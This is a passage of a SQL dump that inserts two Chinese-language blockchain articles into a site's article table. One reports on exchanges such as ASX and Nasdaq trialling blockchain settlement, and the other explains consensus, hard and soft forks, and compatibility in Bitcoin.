INSERT INTO `movesay_article` VALUES ('11', '区块链开始从炒作转向实际应用', null, '<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	澳大利亚证券交易所副总裁Peter Hiom在今年的证券行业会议上宣布，他的言论将涉及区块链，“这是每一个人都喜欢的话题，”他开玩笑说，“或者说是新的黑科技”。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	在金融领域，比特币背后的技术已被讨论了很多。但截至目前，大多数的讨论分成了两类：科普这项技术是什么，以及它能在银行业和市场的不同领域发挥的作用。另一类则是炒作，部分最热心的区块链支持者和早期投资者认为，它可能带来重大的变化。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<img alt=\"asx\" src=\"https://news.huobi.com/public/picture/edit/1610/213858_111100_1970_0.jpeg\" style=\"height:auto;border:0px;\" />\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	现在，创业公司和现有金融市场的大公司们，正开始测试区块链技术的不同用途。澳大利亚证券交易所（ASX）已采取了一些最为大胆的区块链实验。在今年，其宣布与数字资产控股（DAH）公司达成合作，将澳大利亚的股票清算与结算系统移至区块链。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	“今天，区块链技术并不是一种产品或技术，它更多的是公司们正要经历和理解的旅程或过程，” Bloq联合创始人Matt Roszak表示，“这与我们在20年前见证的互联网，或10年前所看到的云计算非常相似。”\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	区块链是一种交易的电子账本，而交易验证记录在“区块”当中。这个账本分布在网络上的各个计算机节点上，并受到加密技术的保护。有人说，区块链对银行和交易所而言是一种威胁，因为它可移除对中央权力机构的需求，从而实现脱媒。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	但也有人认为，区块链对现有金融机构而言是一个机会，它可通过消除低效率，以及对贸易保险的需求，来节省数十亿美元的成本。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	去年，由 Santander InnoVentures、Oliver Wyman以及Anthemis集团发布的分析估计，到2022年，分布式账本技术可每年减少银行150亿至200亿美元的基础设施成本（包括跨境支付，证券交易以及监管合规费用）。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	“每10年左右，市场上的技术就会发生巨大的变化，”英国初创公司Setl的首席执行官Peter Randall表示，“现在是时候在交易后领域使用21世纪的技术了。分布式账本技术是一种适当且合适的技术。”\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	纳斯达克是另一家使用区块链技术的交易所，它已在其美国地区的私人交易市场使用了这种技术，并在爱沙尼亚市场进行测试使用。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	DTCC,美国的清算和结算服务提供商，其已将区块链用于存储信用违约掉期的交易信息。与此同时，欧洲清算所（Euroclear），世界上最大的结算公司之一，其已和创业公司Paxos达成合作，为伦敦市场开发了一个新的结算系统。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	“在未来12-18个月，我们将看到很多不同的，针对不同问题的解决方案，” 区块链创业公司Symbiont的首席执行官 Mark Smith表示。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	上个月，分布式账本技术公司R3、Credit Suisse、 Symbiont以及其他公司发布了一个项目，以确定区块链如何可以改善银团贷款市场。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	IT consultant Gartner的研究副总裁Ray Valdes表示，根据他对之前新兴技术的炒作分析，区块链的炒作正处在市场高峰期或之前，他期望这种炒作将很快转向幻灭。“从明年年初开始，我们将在主流媒体上看到，区块链这种东西并不是很好的说法，”他说。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	“然后，随着人们理解了这项技术，他们将弄清楚这项技术如何才能得到有效利用。这个过程可能需要几年。”\r\n</p>\r\n<p style=\"text-indent:2em;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;color:gray;background-color:#FFFFFF;\">\r\n	（此文仅代表作者本人观点，不代表OFC立场）\r\n</p>', null, '1', 'bbb', '0', '1', '1', '0', '1447197343', '1476156827', '1');
INSERT INTO `movesay_article` VALUES ('12', '什么是共识，什么是分叉，什么是兼容性', null, '<span style=\"color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;line-height:20px;background-color:#FFFFFF;\">看到文《什么是硬分叉，什么是软分叉，什么是共识？》写的此文，虽然标题这么写，但是我不打算给一些很具体的定义的，只是聊聊我的理解。因为这么概念本事也是需要共识来形成的。</span>\r\n<h2 style=\"font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-weight:700;color:#333333;font-size:1.5em;font-style:normal;text-align:start;text-indent:0px;background-color:#FFFFFF;\">\r\n	1、<strong>共识</strong>\r\n</h2>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	共识的对立面是权威规定，中心制定。共识的主体是一群体，它前面可以增加一个百分比来修饰。例如75%共识，就是说群体中有75%的个体支持认同。我们常听到的共识有：\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<strong>区块链共识</strong>：就是各节点共同认同下一个区块，形成区块链，比特币是采用POW算力来实现的，需要100%共识，没有获得共识的新区块会成为孤立区块，无法写入主链。而若持续获得一定共识那么就会形成分叉链。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<strong>算力共识</strong>：就是算力投票。一般在每个区块的Coinbase字段写入特定支持的字段，或者通过版本号来进行投票。比特币的Classic版本就近似是规定了达到75%的算力共识时，启动2MB硬分叉，而在BIP9规则下，需要达到95%算力共识才会启动软分叉。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<strong>社区共识</strong>：就像是总统大选的选民民意，通过民意调查只能得到近似的值且会变动，同样社区共识也无法得到准确的值，只能由算力投票、币量投票和节点投票，以及一些社区投票来大致的得到近似。社区共识的主体不仅仅是粉忠，用户，炒币者等自然人，还包括公司组织等，每个个体的观点需要根据其在币圈的地位影响进行加权。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<strong>协议共识</strong>：比特币交易格式、区块格式和设定规则等。交易格式是每笔交易的格式要求，区块格式是众交易打包形成区块传成链的要求，设定规则是币总量产量减半设定，难度调整设定，手续费的硬性设定等等。当无法形成100%的协议共识时，往往就会形成分叉。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<img alt=\"\" src=\"https://news.huobi.com/public/picture/edit/1610/213858_110925_2335_0.png\" style=\"height:auto;border:0px;\" />\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<strong>投票社区共识</strong>\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	http://8btc.com/thread-40509-1-1.html\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<h2 style=\"font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-weight:700;color:#333333;font-size:1.5em;font-style:normal;text-align:start;text-indent:0px;background-color:#FFFFFF;\">\r\n	2、<strong>分叉</strong>\r\n</h2>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	分叉有区别为普通的升级，普通的升级在升级前后是没有影响协议共识的，也一般不需要社区共识或算力共识的参与。而分叉根据对协议的修改情况分为软分叉和硬分叉。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	现有的定义：\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	【闪电定义】硬分叉是指比特币区块格式或交易格式（这就是广泛流传的“共识”(应该是部分协议共识)）发生改变时，未升级的节点拒绝验证已经升级的节点生产出的区块，不过已经升级的节点可以验证未升级节点生产出的区块，然后大家各自延续自己认为正确的链，所以分成两条链。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	https://bitcoin.org/en/glossary/hard-fork\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	A permanent divergence in the the block chain, commonly occurs when non-upgraded nodes can’t validate blocks created by upgraded nodes that follow newer consensus rules.\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	【闪电定义】软分叉是指比特币交易的数据结构（这就是被广泛流传的“共识”(应该是部分协议共识)）发生改变时，未升级的节点可以验证已经升级的节点生产出的区块，而且已经升级的节点也可以验证未升级的节点生产出的区块。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	https://bitcoin.org/en/glossary/soft-fork\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	A temporary fork in the block chain which commonly occurs when miners using non-upgraded nodes violate a new consensus rule their nodes don’t know about.\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	我觉得不能说哪个定义正确还是错误，具体的定义可以根据已经较大社区共识的两者的区别来自己总结，不需要权威来指定。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<strong>硬分叉：</strong>没有向前兼容性，之前的版本将不可再用，需要强制升级。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<strong>软分叉：</strong>有较好的兼容性，之前版本至少部分功能可用，可不升级。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<strong>硬分叉：</strong>在区块链层面会有分叉的两条链，一条原旧链，一条分叉新链。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<strong>软分叉：</strong>在区块链层面没有分叉的链，只是组成链的区块，有新区块和旧区块。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<strong>硬分叉：</strong>需要在某个时间点全部同意分叉升级，不同意的将会进入原旧链。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<strong>软分叉：</strong>相当长的时间里，可允许不进行升级，继续使用原版本生成旧区块，与新区块并存。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<img alt=\"\" src=\"https://news.huobi.com/public/picture/edit/1610/213858_110925_6241_1.jpg\" style=\"height:auto;border:0px;\" />\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	硬分叉与软分叉区块示意图\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<h2 style=\"font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-weight:700;color:#333333;font-size:1.5em;font-style:normal;text-align:start;text-indent:0px;background-color:#FFFFFF;\">\r\n	3、<strong>兼容性</strong>\r\n</h2>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	在分叉的定义中，很大程度上提到了兼容性。根据百科的定义分为向上兼容和向下兼容。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<strong>向上兼容</strong>，在较低档计算机上编写的程序，可以在同一系列的较高档计算机上运行，或者在某一平台的较低版本环境中编写的程序可以在较高版本的环境中运行。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<strong>向下兼容</strong>，又称向后兼容（backward compatibility）、回溯兼容，在计算机中指在一个程序和/或库更新到较新版本后，用旧版本程序创建的文档或系统仍能被正常操作或使用（包括写入），或在旧版本库的基础上开发的程序仍能正常编译运行的情况。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	兼容性在具体到比特币后，包括：节点，交易，区块三个层面。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<strong>（１）节点层面</strong>\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	节点向前兼容，没有升级的节点接受升级过的节点生产的交易和区块，即原旧节点，在新节点的网络中依旧可以运行，这是软分叉能实现，而硬分叉无法实现的。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	节点向后兼容，升级过的节点接受没有升级的节点生产的交易和区块，即之前的旧交易和旧区块依旧有效，这是无论软分叉和硬分叉都能做到的。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<strong>（２）交易层面</strong>\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	扩容硬分叉仅仅是打包区块的大小，对具体交易没有任何影响。因此没有问题。软分叉以隔离验证为例，新交易与旧交易的不同点仅仅在于，隔离验证在打包时，将签名的内容隔离出来。这个签名分离的过程可以由节点发送交易时完成，也可以在节点接受交易后由接受的节点自己来完成。因此在交易层面，节点之间传送交易时，完全可以做到传旧格式交易，也可以传新格式交易。若为了更好的兼容，规定完全传旧格式交易，即使新节点之间也传送旧格式交易都是可以的。因为两种新旧格式的差异仅仅在于签名所在放的位置，可轻易相互转化。做这交易层面的兼容应该是不困难的。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<img alt=\"\" src=\"https://news.huobi.com/public/picture/edit/1610/213858_110925_8508_2.\" style=\"height:auto;border:0px;\" /><br />\r\n隔离验证示意图\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	<strong>（３）区块层面</strong>\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	扩容硬分叉因为旧节点是只接受打包小于1MB的区块，因此硬扩容之后的大区块是无法被旧节点接纳的，从而在区块层面，硬分叉是无法做到向前兼容的，就是说区块层面，旧节点无法融入大区块节点形成的新网路。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	扩容软分叉。具体隔离验证的原理是将区块打包成了两部分，一部分是不超1MB的交易区块，满足旧节点对于区块的要求，而另外一部分是验证区块。验证区块并不会写入到比特币主链中，因此也就不需要旧节点来校验，就是说验证区块是没有大小限制的。有些人担心旧节点不会校验这些验证了，会不会不安全，其实还有新节点在校验呢。新节点也是足够多的。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	另外在隔离验证新区块出现时，应该是可以与原来的旧区块做到共存的。当在上一个区块的结果上计算下一个区块时，仅仅只看上一个区块的HASH值即可，根本就不必关心上一个区块是旧区块还是新区块。同样新打包的区块，不论是新旧，都可以被所有的新旧节点接纳，因为主链部分是小于1MB的符合旧节点的接纳条件。另外不同点在于新节点在接受新区块时，还附带接受隔离出来的验证，以便进行验证交易。\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<p style=\"text-indent:2em;color:#333333;font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', sans-serif;font-size:14px;font-style:normal;font-weight:normal;text-align:start;background-color:#FFFFFF;\">\r\n	&nbsp;\r\n</p>\r\n<h2 style=\"font-family:\'Microsoft Yahei\', Arial, Helvetica, \'Hiragino Sans GB\', \'WenQuanYi Micro Hei\', 